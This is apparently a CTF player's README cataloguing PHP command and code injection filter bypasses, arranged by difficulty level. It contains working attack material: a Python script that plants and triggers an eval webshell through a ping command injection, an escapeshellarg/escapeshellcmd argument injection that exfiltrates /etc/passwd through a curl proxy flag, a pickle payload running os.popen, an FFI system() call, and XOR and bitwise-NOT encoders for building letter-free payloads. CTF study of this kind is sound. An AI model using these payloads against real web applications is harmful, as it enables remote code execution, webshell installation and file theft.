### My-PHP-Command-Code-Injection-Reivew

Have playing CTF for 2 years, seem long but not as much as I think. I have conduct some small experience and technique to build payload and this is about it.
The resource is plenty if not want to say overwhelming for an individual to find and read all of that and most of it often repeated the same marterial over and over.
This make things harder for development progress of academic and techicial aspect in Web Security and my self so I decided to take the knowledge that I have learned throught CTFs and trying to "system" it.
If anyone find this and love it, share with others or help me to develop it

### 01. The scenario
The scenario of this topic would be like this. 
A CTF challenge that allows you to Inject Code or Command but have some filter, you as a player need to bypass that.
I will try and devide that filter into many level that you may meet. But first you need to identify some thing

### 02. The method of identify
If you know CTF you know that ASCII is not complete. With a preg_match identify what you can do to build the payload.

```php
<?php
	for ($ascii = 0; $ascii < 256; $ascii++) {
		if (!preg_match("/^[a-zA-Z0-9 \s]+$/", chr($ascii))) { // input your preg_match
			echo (chr($ascii));
			echo "\t";
		}
	}
?>
```
### Level 1. Allow all characters
This will be an easy task, when it come to this type of things, you often only need to seperate your payload and the before code

```bash 
  `   |   ||   &   &&   .   ;   -   <>   $    %0a 
```

\`ls\` is a way googling about it

### Level 2. Allow all characters but filted length.
You will be restricted. <?`$_GET[c]` will be too long or system('cat flag_abcxyz') would be imposible
The idea of code injection would be write the command to a file first, then use sh filename to execute the script and get the shell
or with the command injection `nl *` would be enough

Sample of a challenge:
```php
<?php 
show_source(__FILE__);
$ip = isset($_POST['ip'])?$_POST['ip']:die();

if(!preg_match('/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/i',$ip)){
    die("ip");
}

echo strlen($ip);

if(strlen($ip)<7||strlen($ip)>21){
    die("ip");
}

    // Determine OS and execute the ping command.
if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        
    $cmd = shell_exec( 'ping  ' .$ip );
}else {
        // *nix
        $cmd = shell_exec( 'ping  -c 1 ' .$ip );
}

    // Feedback for the end user
echo  "<pre>{$cmd}</pre>";





```

Sample of devide the command:

```python
#!/usr/bin/python
#-*- coding: utf-8 -*- 

import requests

url = "http://127.0.0.1:8000/exec2.php"
for i in "echo '<?php @eval($_POST[1]);?>' > shell.php ":
    data = {"ip":"0.0.0.0;echo -n \\"+i+">>1"}
    res = requests.post(url,data=data)
print("[*] bash shell upload successful!")

data={"ip":"0.0.0.0;bash 1"}
res=requests.post(url,data=data)

shell="http://127.0.0.1:8000/shell.php"

res=requests.get(shell)
if  res.status_code == 200:
    print("[*] get shell successful")
    
```

### Level 3. Wrong use of functions.
I don't know much about this thought, it is rarely meet because often need  php version 
reference:
[https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html](https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html)

This is the parameter injection caused by the wrong use of escapeshellarg and escapeshellcmd:

```
$url = "http://127.0.0.1/' -F file=@/etc/passwd -x 127.0.0.1:9999"; 
```

After being processed by escapeshellarg, it becomes:

```
'http://127.0.0.1/'\'' -F file=@/etc/passwd -x 127.0.0.1:9999'
```

After processing with escapeshellcmd, it becomes:
```
'http://127.0.0.1/'\\'' -F file=@/etc/passwd -x 127.0.0.1:9999\'
```
Cause the -F and -x parameters to escape single quotes, causing arbitrary file reading.

### Level 4. Allow some function or class
This is the one that I personally hate the most because it is purely bruteforce function.
This time, some function and class will allow you to execute, in this scenario try some of the following for php:

```php
<?php 
  $ffi=FFI::cdef("int system(const char *command);");
  $ffi->system('ls');
?>
exec
system
passthru
shell_exec
escapeshellarg
escapeshellcmd
proc_close
proc_open
dl
popen
show_source
posix_kill
posix_mkfifo
posix_getpwuid
posix_setpgid
posix_setsid
posix_setuid
posix_setgid
posix_seteuid
posix_setegid
posix_uname
pcntl_exec
expect_popen

If Py try this maybe:
%22c__builtin__%0Aeval%0A%28S%27os.popen%28%27cat%20/var/www/flag%27%29.readlines%28%29%27%0AtR.%22


```
Also there is one more class that doing the same as execute function, but I couldn't remember it.
Using get_defined_functions can help you more.

If you really sure that all the function is filtered, try to understand this payload:
```php
$a=blag;$a{0}=f;111111111111111111111;?>
```


### Level 5. Not allow alphabet and word (XOR now)
This time the code on 02. The method of identify would be star. Identify what chars is allow then build the function up from there. 
This time real bypass, the easiest way is using XOR of PHP

Using the code bellow and identify what you want:
```php
<?php
for($i=128;$i<255;$i++){
	echo sprintf("%s^%s",urlencode(chr($i)),urlencode(chr(255)))."=>". (chr($i)^chr(255))."\n";
}
?>
```
And the code bellow for flash person in CTF (not entirely my code of course)

```php
<?php
$shell = "assert";
$result1 = "";
$result2 = "";
for ($num = 0;$num <= strlen($shell);$num++)
{
    for ($x = 33;$x < 126;$x++)
    {
        if (judge(chr($x)))
        {
            for ($y = 33;$y <= 126;$y++)
            {
                if (judge(chr($y)))
                {
                    $f = chr($x) ^ chr($y);
                    if ($f == $shell[$num])
                    {
                        $result1 .= chr($x);
                        $result2 .= chr($y);
                        break 2;
                    }
                }
            }
        }
    }
}
echo $result1;
echo "<br>";
echo $result2;

function judge($c)
{
    if (!preg_match('/[a-z0-9]/is', $c))
    {
        return true;
    }
    return false;
}

```

One more thing:
PHP 5 and PHP 7 asseet() function is different 
You can do this in PHP 5 but not in PHP 7 so be careful

<?php
$x='assert'; //yes string
echo $x("phpinfo();");
?>






### Level 6. Not allow alphabet and number
This is a bit difficult and will be confuse but often because ascii is not complete, using it is an advantage 

Using reverse bytes to inject. The negative sign is ~, It's also an operator. In the binary representation of numbers, take 0 Turn into 1, take 1 Turn into 0. 

Reverse the string then reverse again in the payload. 

```php
<?php 
$a = urlencode(~'exec'); 
echo $a; 
$b = urlencode(~'nl /*'); 
echo $b; 
//(~%9A%87%9A%9C)((~%91%93%DF%D0%D5)); 
```

### Level 07. Find the flag with only some words
In 1 CTF I meet a really special CTF where we use linux glob wildcard
https://tldp.org/LDP/GNU-Linux-Tools-Summary/html/x11655.htm

For easier to unserstand it is something like this:
![Screenshot from 2021-05-30 15-36-02](https://user-images.githubusercontent.com/62769629/120097836-d46d0a80-c15c-11eb-9825-ea206db37141.png)


* Can replace 0 More than one arbitrary file

? Can represent any character

[^a] Can be used to determine whether the character in this position is a

[0-9] Can be used to limit the scope

adopt ascii We know the code table , You can see the capital letters @ And [ Between , So we can use [@-[] To represent a capital letter .

Sum up , We can use . /???/????????[@-[] To match /tmp/XXXXXXXXX

So, you can use this to find the flag

### Level 08. Some special 
Of course there are many more
Baby PHP:
https://ctftime.org/writeup/15946

Liveoverflow bash without letter:
https://www.youtube.com/watch?v=6D1LnMj0Yt0


